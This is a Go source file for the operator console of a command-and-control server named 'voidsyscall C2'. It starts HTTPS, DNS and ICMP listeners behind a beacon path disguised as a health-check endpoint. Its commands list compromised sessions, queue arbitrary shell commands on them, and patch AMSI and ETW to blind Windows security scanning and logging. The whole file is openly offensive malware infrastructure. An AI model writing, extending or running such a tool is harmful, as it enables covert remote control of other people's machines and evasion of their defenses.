package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/VoidSecSoftwares/voidsyscall/server"
)

func parseSessionID(s string) ([16]byte, bool) {
	var id [16]byte
	decoded, err := hex.DecodeString(s)
	if err != nil {
		return id, false
	}
	if len(decoded) > 16 {
		return id, false
	}
	copy(id[:], decoded)
	return id, true
}

func printHelp() {
	fmt.Println()
	fmt.Printf("%s%sCommands%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
	fmt.Println()
	fmt.Printf("  %s%-24s%s%s\n", server.AnsiGreen, "sessions | ls", server.AnsiReset, "List active sessions")
	fmt.Printf("  %s%-24s%s%s\n", server.AnsiGreen, "shell <id> <command>", server.AnsiReset, "Run a shell command on a session")
	fmt.Printf("  %s%-24s%s%s\n", server.AnsiGreen, "patch <id> <amsi|etw|both>", server.AnsiReset, "Patch AMSI/ETW on a session")
	fmt.Printf("  %s%-24s%s%s\n", server.AnsiGreen, "help", server.AnsiReset, "Show this help")
	fmt.Printf("  %s%-24s%s%s\n", server.AnsiGreen, "exit | quit", server.AnsiReset, "Shut down the server")
	fmt.Println()
}

func main() {
	httpAddr := flag.String("http-addr", "0.0.0.0", "HTTP listen address")
	httpPort := flag.Int("https-port", 443, "HTTPS port")
	dnsAddr := flag.String("dns-addr", "0.0.0.0", "DNS listen address")
	dnsPort := flag.Int("dns-port", 53, "DNS port")
	icmpAddr := flag.String("icmp-addr", "0.0.0.0", "ICMP listen address")
	beaconPath := flag.String("path", "/api/v2/health", "Beacon endpoint path")
	certFile := flag.String("cert", "", "TLS certificate file")
	keyFile := flag.String("key", "", "TLS key file")
	flag.Parse()

	cfg := &server.ServerConfig{
		HTTPAddr:   *httpAddr,
		HTTPSPort:  *httpPort,
		DNSAddr:    *dnsAddr,
		DNSPort:    *dnsPort,
		ICMPAddr:   *icmpAddr,
		BeaconPath: *beaconPath,
		CertFile:   *certFile,
		KeyFile:    *keyFile,
	}

	if *certFile == "" || *keyFile == "" {
		fmt.Fprintln(os.Stderr, "[-] --cert and --key are required")
		os.Exit(1)
	}

	srv := server.NewServer(cfg)

	fmt.Printf("%s%s%s\n", server.AnsiCyan, "╔══════════════════════════════════════════╗", server.AnsiReset)
	fmt.Printf("%s%s%s\n", server.AnsiCyan, "║       voidsyscall C2 — v1.0.0            ║", server.AnsiReset)
	fmt.Printf("%s%s%s\n", server.AnsiGreen, "║  VoidSec Softwares                       ║", server.AnsiReset)
	fmt.Printf("%s%s%s\n", server.AnsiGreen, "║  HTTPS / DNS / ICMP                      ║", server.AnsiReset)
	fmt.Printf("%s%s%s\n", server.AnsiCyan, "╚══════════════════════════════════════════╝", server.AnsiReset)
	fmt.Println()

	go func() {
		for {
			var input string
			fmt.Print(server.AnsiBold + server.AnsiCyan + "voidsyscall> " + server.AnsiReset)
			fmt.Scanln(&input)
			input = strings.TrimSpace(input)
			if input == "" {
				continue
			}

			parts := strings.SplitN(input, " ", 2)
			cmd := parts[0]
			var args string
			if len(parts) > 1 {
				args = parts[1]
			}

			switch cmd {
			case "sessions", "ls":
				fmt.Println(srv.ListSessions())
			case "help":
				printHelp()
			case "shell":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s shell <session-hex> <command>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				if err := srv.RunShell(sid, parts2[1]); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sTask queued%s\n", server.AnsiGreen, server.AnsiReset)
				}
			case "patch":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s patch <session-hex> <amsi|etw|both>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				var patchType byte
				switch strings.ToLower(parts2[1]) {
				case "amsi":
					patchType = 0x01
				case "etw":
					patchType = 0x02
				case "both":
					patchType = 0x03
				default:
					fmt.Printf("%sUnknown patch type%s\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.PatchTarget(sid, patchType); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sPatch task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}
			case "exit", "quit":
				fmt.Printf("%sShutting down...%s\n", server.AnsiYellow, server.AnsiReset)
				os.Exit(0)
			default:
				fmt.Printf("%sUnknown command: %s%s\n", server.AnsiRed, cmd, server.AnsiReset)
				fmt.Printf("Type %shelp%s for a list of commands\n", server.AnsiCyan, server.AnsiReset)
			}
		}
	}()

	if err := srv.Run(); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}
